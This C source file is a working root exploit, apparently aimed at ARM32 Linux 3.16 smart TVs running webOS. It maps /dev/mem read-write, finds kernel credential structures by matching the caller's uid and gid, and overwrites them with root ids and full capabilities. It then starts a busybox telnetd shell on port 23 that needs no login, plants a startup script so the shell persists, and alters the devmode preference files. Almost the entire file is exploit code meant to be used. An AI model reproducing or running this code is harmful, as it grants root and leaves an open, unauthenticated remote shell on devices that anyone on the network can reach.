/* /dev/mem cred patcher v3 — strict cred-shape validation.
 * cred (linux 3.16, arm32):
 *   usage,u32 | uid,gid,suid,sgid,euid,egid,fsuid,fsgid (8xu32)
 *   securebits u32 | cap_inheritable..cap_bset (4 x kernel_cap_t=2xu32)
 * For an unprivileged process: effective==0, bset==CAP_FULL_SET.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define PHYS_END 0x3b000000ULL
#define CHUNK    (16u << 20)
#define MAX_HITS 64

static int looks_like_cred(const uint8_t *p) {
    uint32_t usage   = *(const uint32_t *)(p - 4);
    uint32_t secbits = *(const uint32_t *)(p + 32);
    uint64_t eff     = *(const uint64_t *)(p + 52); /* cap_effective   */
    uint64_t bset    = *(const uint64_t *)(p + 60); /* cap_bset        */
    if (usage == 0 || usage > 64) return 0;
    if (secbits != 0) return 0;
    if (eff != 0) return 0;                        /* unprivileged    */
    if ((bset & 0xffffffffULL) != 0xffffffffULL) return 0;
    uint32_t hi = (uint32_t)(bset >> 32);
    if (hi == 0 || hi > 0xff) return 0;            /* 0x1f..0xff      */
    return 1;
}

int main(void) {
    uint32_t uid = getuid(), gid = getgid();
    uint32_t pat[8] = {uid, gid, uid, gid, uid, gid, uid, gid};
    fprintf(stderr, "[*] uid=%u gid=%u\n", uid, gid);

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) { perror("open /dev/mem"); return 1; }

    int hits = 0;
    for (off_t base = 0; base < PHYS_END && hits < MAX_HITS; base += CHUNK) {
        size_t len = CHUNK;
        if (base + len > PHYS_END) len = PHYS_END - base;
        uint8_t *m = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, base);
        if (m == MAP_FAILED) continue;
        fprintf(stderr, "[.] %llu/%llu MB\n",
                (unsigned long long)(base >> 20), (unsigned long long)(PHYS_END >> 20));
        for (size_t off = 4; off + 68 <= len; off += 4) {
            if (memcmp(m + off, pat, 32) != 0) continue;
            if (!looks_like_cred(m + off)) continue;
            fprintf(stderr, "[+] cred @0x%llx usage=%u\n",
                    (long long)(base + off - 4),
                    *(uint32_t *)(m + off - 4));
            memset(m + off, 0, 32);
            memset(m + off + 36, 0xff, 32);      /* caps -> full    */
            hits++;
        }
        munmap(m, len);
    }
    close(fd);
    if (getuid() != 0) { fprintf(stderr, "[!] hits=%d, still not root\n", hits); return 2; }
    setresuid(0, 0, 0); setresgid(0, 0, 0);
    fprintf(stderr, "[*] hits=%d, uid=%u — rooting\n", hits, getuid());
    system("(/bin/busybox telnetd -l /bin/sh -p 23 2>/dev/null || /usr/sbin/telnetd -l /bin/sh -p 23 2>/dev/null) &");
    system("D=/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service; "
           "printf '#!/bin/sh\\n/bin/busybox telnetd -l /bin/sh -p 23\\n' > $D/start-devmode.sh; "
           "chmod 755 $D/start-devmode.sh");
    system("rm -rf /var/luna/preferences/devmode_enabled && mkdir -p /var/luna/preferences/devmode_enabled");
    system("sync");
    fprintf(stderr, "[*] done — telnet <tv-ip> 23\n");
    return 0;
}
